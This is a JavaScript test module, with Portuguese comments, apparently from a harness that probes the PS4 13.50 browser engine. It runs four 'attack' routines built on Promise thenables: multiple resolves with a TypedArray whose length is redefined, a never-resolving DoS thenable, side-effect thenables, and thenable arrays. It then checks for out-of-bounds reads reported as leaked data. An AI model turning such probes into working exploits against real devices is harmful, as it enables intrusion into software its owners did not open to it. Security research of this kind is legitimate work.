/**
 * TEST: Thenable Confusion Attack
 * Explora objetos com .then() para confundir Promise e sistemas async
 * PS4 13.50: async/await pode estar presente ou parcial
 */

export const testThenableConfusion = {
    id: 'THENABLE_CONFUSION',
    name: 'Thenable Confusion',
    risk: 'MEDIUM',
    category: 'TYPES',
    description: 'Usa objetos thenable para confundir sistemas de tipos assíncronos',
    ps4Compatible: true,

    setup: function() {
        this.thenableTraps = [];
        this.confusionResults = [];
        this.asyncLeakedData = null;
    },

    probe: [
        function(scenario) {
            return scenario.confusionResults.length;
        },
        function(scenario) {
            return scenario.asyncLeakedData ? 1 : 0;
        }
    ],

    trigger: async function() {
        this.thenableTraps = [];
        this.confusionResults = [];

        // ==========================================
        // ATAQUE 1: Thenable que modifica o resolvedor
        // ==========================================
        try {
            const maliciousThenable = {
                then: function(resolve, reject) {
                    // Resolve com um objeto que tem .length corrompido
                    const evilResult = new Uint32Array(16);
                    evilResult.fill(0xDEADBEEF);
                    
                    // Tenta corromper após resolver
                    Object.defineProperty(evilResult, 'length', {
                        value: 1000000,
                        writable: true
                    });
                    
                    // Chama resolve múltiplas vezes
                    resolve(evilResult);
                    resolve('second_resolve'); // Deveria ser ignorado
                    resolve({ corrupted: true }); // Deveria ser ignorado
                }
            };

            const result = await Promise.resolve(maliciousThenable);
            
            this.confusionResults.push({
                test: 'THENABLE_MULTI_RESOLVE',
                resultType: typeof result,
                resultLength: result?.length,
                resultByteLength: result?.buffer?.byteLength,
                success: true
            });

            // Tenta OOB via resultado
            if (result?.length > 1000) {
                try {
                    const oobVal = result[20];
                    if (oobVal !== undefined) {
                        this.asyncLeakedData = {
                            index: 20,
                            value: '0x' + oobVal.toString(16)
                        };
                    }
                } catch (e) {}
            }

        } catch (e) {
            this.confusionResults.push({
                test: 'THENABLE_ERROR',
                error: e.message
            });
        }

        // ==========================================
        // ATAQUE 2: Thenable que nunca resolve (DoS)
        // ==========================================
        try {
            let hangDetected = false;
            const hangingThenable = {
                then: function(resolve, reject) {
                    // Não chama nada - trava Promise
                    // Mas podemos detectar se a Promise ficou pendurada
                }
            };

            const timeoutPromise = new Promise((_, reject) => {
                setTimeout(() => reject(new Error('timeout')), 100);
            });

            try {
                await Promise.race([
                    Promise.resolve(hangingThenable),
                    timeoutPromise
                ]);
            } catch (e) {
                hangDetected = true;
                this.confusionResults.push({
                    test: 'THENABLE_HANG',
                    detected: true,
                    success: true
                });
            }

        } catch (e) {
            this.confusionResults.push({
                test: 'THENABLE_HANG_ERROR',
                error: e.message
            });
        }

        // ==========================================
        // ATAQUE 3: Thenable com side effects
        // ==========================================
        try {
            let sideEffectCount = 0;
            const sideEffectThenable = {
                then: function(resolve, reject) {
                    // Efeito colateral: modifica variáveis externas
                    sideEffectCount++;
                    
                    // Tenta acessar e modificar coisas
                    try {
                        // Cria TypedArray com length corrompido
                        const arr = new Uint32Array(4);
                        Object.defineProperty(arr, 'length', { value: 1000000 });
                        resolve(arr);
                    } catch (e) {
                        resolve(42);
                    }
                }
            };

            const result = await Promise.resolve(sideEffectThenable);
            
            this.confusionResults.push({
                test: 'THENABLE_SIDE_EFFECT',
                sideEffectCount: sideEffectCount,
                resultType: typeof result,
                resultLength: result?.length,
                success: true
            });

        } catch (e) {
            this.confusionResults.push({
                test: 'THENABLE_SIDE_EFFECT_ERROR',
                error: e.message
            });
        }

        // ==========================================
        // ATAQUE 4: Array de thenables
        // ==========================================
        try {
            const thenableArray = [];
            for (let i = 0; i < 10; i++) {
                thenableArray.push({
                    then: function(resolve) {
                        resolve(0x13370000 + i);
                    },
                    _index: i
                });
            }

            // Promise.all com thenables
            const results = await Promise.all(thenableArray);
            
            this.confusionResults.push({
                test: 'THENABLE_ARRAY',
                arrayLength: results.length,
                sampleValues: results.slice(0, 3).map(v => '0x' + v.toString(16)),
                success: true
            });

        } catch (e) {
            this.confusionResults.push({
                test: 'THENABLE_ARRAY_ERROR',
                error: e.message
            });
        }
    },

    cleanup: function() {
        this.thenableTraps = null;
    },

    customValidator: function(baseResults, afterResults) {
        // OOB via thenable
        if (this.asyncLeakedData) {
            return {
                anomaly: true,
                reason: `💥 THENABLE OOB: Dados vazados via Promise async!\n${JSON.stringify(this.asyncLeakedData)}`
            };
        }

        // Multi-resolve detectado
        const multiRes = this.confusionResults?.filter(r => r.test === 'THENABLE_MULTI_RESOLVE');
        if (multiRes && multiRes.length > 0 && multiRes[0].resultLength > 1000) {
            return {
                anomaly: true,
                reason: `🏆 THENABLE LENGTH LEAK: Thenable retornou objeto com length corrompido (${multiRes[0].resultLength})`
            };
        }

        return { anomaly: false, reason: '' };
    }
};
